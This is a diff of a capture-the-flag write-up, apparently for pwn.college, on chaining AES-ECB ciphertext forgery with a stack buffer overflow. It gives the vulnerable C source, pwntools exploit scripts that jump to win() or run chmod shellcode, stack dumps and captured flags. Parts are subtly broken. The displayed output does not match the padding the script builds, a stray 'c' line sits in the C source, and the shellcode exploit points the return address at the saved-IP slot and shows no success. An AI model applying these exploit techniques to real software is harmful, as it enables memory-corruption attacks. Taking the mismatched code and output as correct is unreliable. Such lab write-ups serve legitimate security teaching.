@@ -335,28 +335,29 @@ def get_encrypted_block(payload_bytes):
 
 print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
 
-# 1. AES block 0 - "VERIFIED" header and length (16 bytes)
+# Block 1 - "VERIFIED" header and length (16 bytes)
 sample_cipher = get_encrypted_block(b"A")
 header_block = sample_cipher[0:16]
 
-# 2. AES block 1-6 - Padding (16 * 6 = 96 bytes)
-padding_block = sample_cipher[16:32]
-padding = padding_block * 6             
+# Block 2-7 - Padding chain
+padding_harvest = get_encrypted_block(b"B" * 16)
+padding_block = padding_harvest[16:32]  
+padding_blocks = padding_block * 6
 
-# 3. AES block 7 - Return address payload (8 * 8 = 16 bytes)
-win_addr_block = b"B" * 8 
+# Block 7 - Return address overwrite
+win_addr_block = b"C" * 8 
 win_addr_block += p64(win_addr)
 return_addr_cipher = get_encrypted_block(win_addr_block)
 return_address_block = return_addr_cipher[16:32]
 
 # 4. Final AES block - PKCS7 padding (16 bytes)
-padding_suffix = sample_cipher[-16:]
+pkcs_padding_suffix = sample_cipher[-16:]
 
 # Craft payload
 payload = header_block 
-payload += padding 
+payload += padding_blocks
 payload += return_address_block 
-payload += padding_suffix
+payload += pkcs_padding_suffix
 
 # 5. Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
@@ -650,7 +651,7 @@ We also need the address of the `win()` function.
 
 ```
 pwndbg> info address win
-Symbol "win" is at 0x4018f7 in a file compiled without debugging.
+Symbol "win" is at 0x4013b6 in a file compiled without debugging.
 ```
 
 ### Exploit
@@ -659,7 +660,7 @@ Symbol "win" is at 0x4018f7 in a file compiled without debugging.
 from pwn import *
 
 # Initialize values
-win_addr = 0x4018f7  
+win_addr = 0x4013b6  
 
 def get_encrypted_block(payload_bytes):
     """
@@ -674,28 +675,29 @@ def get_encrypted_block(payload_bytes):
 
 print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
 
-# 1. AES block 0 - "VERIFIED" header and length (16 bytes)
+# Block 1 - "VERIFIED" header and length (16 bytes)
 sample_cipher = get_encrypted_block(b"A")
 header_block = sample_cipher[0:16]
 
-# 2. AES block 1-6 - Padding (16 * 6 = 96 bytes)
-padding_block = sample_cipher[16:32]
-padding = padding_block * 6          
+# Block 2-7 - Padding chain
+padding_harvest = get_encrypted_block(b"B" * 16)
+padding_block = padding_harvest[16:32]  
+padding_blocks = padding_block * 7
 
-# 3. AES block 7 - Return address payload (8 * 8 = 16 bytes)
-win_addr_block = b"B" * 8 
+# Block 7 - Return address overwrite
+win_addr_block = b"C" * 8 
 win_addr_block += p64(win_addr)
 return_addr_cipher = get_encrypted_block(win_addr_block)
 return_address_block = return_addr_cipher[16:32]
 
 # 4. Final AES block - PKCS7 padding (16 bytes)
-padding_suffix = sample_cipher[-16:]
+pkcs_padding_suffix = sample_cipher[-16:]
 
 # Craft payload
 payload = header_block 
-payload += padding 
+payload += padding_blocks
 payload += return_address_block 
-payload += padding_suffix
+payload += pkcs_padding_suffix
 
 # 5. Pass payload
 print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
@@ -706,49 +708,331 @@ p.interactive()
 ```
 
 ```
-hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
+hacker@integrated-security~ecb-to-win-hard:~$ python ~/script.py 
 [*] Harvesting ciphertext blocks from the ECB encryption oracle...
-[*] Dispatching assembled ciphertext (144 bytes) to target...
-[+] Starting local process '/challenge/vulnerable-overflow': pid 12954
+[*] Dispatching assembled ciphertext (160 bytes) to target...
+[+] Starting local process '/challenge/vulnerable-overflow': pid 664
 [*] Switching to interactive mode
-Your message header: VERIFIED\x01
-Your message length: 1
-Decrypted message: A\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fBBBBBBBB\xf7\x18@!
-+---------------------------------+-------------------------+--------------------+
-|                  Stack location |            Data (bytes) |      Data (LE int) |
-+---------------------------------+-------------------------+--------------------+
-| 0x00007fff82037f60 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007fff82037f68 (rsp+0x0008) | 38 81 03 82 ff 7f 00 00 | 0x00007fff82038138 |
-| 0x00007fff82037f70 (rsp+0x0010) | 28 81 03 82 ff 7f 00 00 | 0x00007fff82038128 |
-| 0x00007fff82037f78 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
-| 0x00007fff82037f80 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
-| 0x00007fff82037f88 (rsp+0x0028) | a0 e6 d3 4a 01 00 00 00 | 0x000000014ad3e6a0 |
-| 0x00007fff82037f90 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
-| 0x00007fff82037f98 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
-| 0x00007fff82037fa0 (rsp+0x0040) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
-| 0x00007fff82037fa8 (rsp+0x0048) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
-| 0x00007fff82037fb0 (rsp+0x0050) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
-| 0x00007fff82037fb8 (rsp+0x0058) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
-| 0x00007fff82037fc0 (rsp+0x0060) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
-| 0x00007fff82037fc8 (rsp+0x0068) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
-| 0x00007fff82037fd0 (rsp+0x0070) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
-| 0x00007fff82037fd8 (rsp+0x0078) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
-| 0x00007fff82037fe0 (rsp+0x0080) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
-| 0x00007fff82037fe8 (rsp+0x0088) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
-| 0x00007fff82037ff0 (rsp+0x0090) | 41 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f41 |
-| 0x00007fff82037ff8 (rsp+0x0098) | 0f 0f 0f 0f 0f 0f 0f 0f | 0x0f0f0f0f0f0f0f0f |
-| 0x00007fff82038000 (rsp+0x00a0) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007fff82038008 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
-+---------------------------------+-------------------------+--------------------+
-The program's memory status:
-- the input buffer starts at 0x7fff82037fa0
-[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 12954)
-- the saved return address (previously to main) is at 0x7fff82038008
-- the address of win() is 0x4018f7.
+[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 664)
+Decrypted message: A\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fBBBBBBBB\xb6\x13@!
 You win! Here is your flag:
-pwn.college{sBaSZzvEAX-48KsnbTM_0LFAcSD.QX3UDMxEDL4ITM0EzW}
+pwn.college{8oPskq3iYUANAHB2VuRKUKH8mWh.QX4UDMxEDL4ITM0EzW}
 
 
 [*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
+## ECB-to-Shellcode (Easy)
+
+### Source code
+
+```c title="/challenge/vulnerable-overflow.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <libgen.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/sendfile.h>
+#include <sys/prctl.h>
+#include <sys/personality.h>
+#include <arpa/inet.h>
+
+#include <openssl/evp.h>
+
+uint64_t sp_;
+uint64_t bp_;
+uint64_t sz_;
+uint64_t cp_;
+uint64_t cv_;
+uint64_t si_;
+uint64_t rp_;
+
+#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
+#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
+#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
+#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
+#define FIND_CANARY(cnp, cv, start)                                     \
+  {                                                                     \
+    cnp = start;                                                        \
+    GET_CANARY(cv);                                                     \
+    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
+  }
+
+void DUMP_STACK(uint64_t sp, uint64_t n)
+{
+    printf("+---------------------------------+-------------------------+--------------------+\n");
+    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
+    printf("+---------------------------------+-------------------------+--------------------+\n");
+    for (si_ = 0; si_ < n; si_++)
+    {
+        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
+               sp+8*si_, 8*si_,
+               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
+               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
+               *(uint64_t *)(sp+8*si_)
+              );
+    }
+    printf("+---------------------------------+-------------------------+--------------------+\n");
+}
+
+#include <capstone/capstone.h>
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+{
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
+    {
+        printf("ERROR: disassembler failed to initialize.\n");
+        return;
+    }
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
+    if (count > 0)
+    {
+        size_t j;
+        printf("      Address      |                      Bytes                    |          Instructions\n");
+        printf("------------------------------------------------------------------------------------------\n");
+
+        for (j = 0; j < count; j++)
+        {
+            printf("0x%016lx | ", (unsigned long)insn[j].address);
+            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
+            for (int k = insn[j].size; k < 15; k++) printf("   ");
+            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
+        }
+
+        cs_free(insn, count);
+    }
+    else
+    {
+        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
+        printf("      Address      |                      Bytes\n");
+        printf("--------------------------------------------------------------------\n");
+        for (unsigned int i = 0; i <= shellcode_size; i += 16)
+        {
+            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
+            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
+            printf("\n");
+        }
+    }
+
+    cs_close(&handle);
+}
+
+void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
+{
+    int current_personality = personality(0xffffffff);
+    assert(current_personality != -1);
+    if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
+    {
+        assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
+        assert(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != -1);
+        execve("/proc/self/exe", argv, envp);
+    }
+}
+
+EVP_CIPHER_CTX *ctx;
+
+int challenge(int argc, char **argv, char **envp)
+{
+    unsigned char key[16];
+    struct
+    {
+        char header[8];
+        unsigned long long length;
+        char message[31];
+    } plaintext = {0};
+
+    // initialize the cipher
+    int key_file = open("/challenge/.key", O_RDONLY);
+    assert(key_file);
+    assert(read(key_file, key, 16) == 16);
+    ctx = EVP_CIPHER_CTX_new();
+    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
+    close(key_file);
+
+    char *ciphertext = malloc(0x1000);
+    size_t ciphertext_len = read(0, ciphertext, 0x1000);
+    assert(ciphertext_len % 16 == 0);  // should be padded
+    assert(ciphertext_len >= 16);      // at least one block
+
+    // first, we verify the first block
+    int decrypted_len;
+    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
+    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);
+
+    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
+    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
+    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
+    assert(plaintext.length <= 16); // verify length
+
+    // decrypt the message!
+    ctx = EVP_CIPHER_CTX_new();
+    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
+    memset(key, 0, sizeof(key));
+    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
+    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);
+
+    printf("Decrypted message: %s!\n", plaintext.message);
+
+    fprintf(stderr, "You've loaded the following shellcode into your message:\n");
+    print_disassembly(plaintext.message, decrypted_len);
+    fprintf(stderr, "\n");
+
+c
+
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    challenge(argc, argv, envp);
+
+}
+```
+
+
+
+## Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+# Initialize values
+buffer_addr = 0x7fffffffe570
+addr_of_saved_ip = 0x7fffffffe5c8 
+shellcode_addr = addr_of_saved_ip  
+
+def get_encrypted_block(payload_bytes):
+    """
+    Interacts with the AES-ECB encryption oracle (dispatcher).
+    Returns the raw ciphertext generated using the hidden system key.
+    """
+    io = process('/challenge/dispatch', level='error')
+    io.send(payload_bytes) 
+    ciphertext = io.readall()
+    io.close()
+    return ciphertext
+
+print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
+
+# Block 1 - "VERIFIED" header and length (16 bytes)
+sample_cipher = get_encrypted_block(b"A")
+header_block = sample_cipher[0:16]
+
+# Block 2 - Shellcode
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+shellcode = asm(shellcode_asm).ljust(16, b'\x90')
+shellcode_cipher = get_encrypted_block(shellcode)
+shellcode_block = shellcode_cipher[16:32]
+
+# Block 2-6 - Padding chain
+padding_harvest = get_encrypted_block(b"B" * 16)
+padding_block = padding_harvest[16:32]
+padding_blocks = padding_block * 4
+
+# Block 7 - Return address overwrite
+shellcode_addr_block = b"C" * 8 
+shellcode_addr_block += p64(shellcode_addr)
+return_addr_cipher = get_encrypted_block(shellcode_addr_block)
+return_address_block = return_addr_cipher[16:32]
+
+# Block 8 - PKCS7 padding
+pkcs_padding_suffix = sample_cipher[-16:]
+
+# Craft payload
+payload = header_block 
+payload += shellcode_block
+payload += padding_blocks
+payload += return_address_block 
+payload += pkcs_padding_suffix
+
+# 5. Pass payload
+print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
+p = process('/challenge/vulnerable-overflow')
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (128 bytes) to target...
+Your message header: VERIFIED\x01
+Your message length: 1
+Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCC\xc8\xe5\xff\xff\xff\x7f!
+You've loaded the following shellcode into your message:
+ERROR: Failed to disassemble shellcode! Bytes are:
+
+      Address      |                      Bytes
+--------------------------------------------------------------------
+0x00007fffffffe570 | 6a 5a 54 5f 58 40 b6 04 0f 05 90 90 90 90 90 90 
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fffffffe530 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe538 (rsp+0x0008) | f8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6f8 |
+| 0x00007fffffffe540 (rsp+0x0010) | e8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6e8 |
+| 0x00007fffffffe548 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
+| 0x00007fffffffe550 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffffffe558 (rsp+0x0028) | 25 05 b5 f6 01 00 00 00 | 0x00000001f6b50525 |
+| 0x00007fffffffe560 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
+| 0x00007fffffffe568 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007fffffffe570 (rsp+0x0040) | 6a 5a 54 5f 58 40 b6 04 | 0x04b640585f545a6a |
+| 0x00007fffffffe578 (rsp+0x0048) | 0f 05 90 90 90 90 90 90 | 0x909090909090050f |
+| 0x00007fffffffe580 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe588 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe590 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe598 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe5a0 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe5a8 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe5b0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe5b8 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007fffffffe5c0 (rsp+0x0090) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
+| 0x00007fffffffe5c8 (rsp+0x0098) | c8 e5 ff ff ff 7f 00 00 | 0x00007fffffffe5c8 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fffffffe570
+- the saved return address (previously to main) is at 0x7fffffffe5c8
 $  
 ```
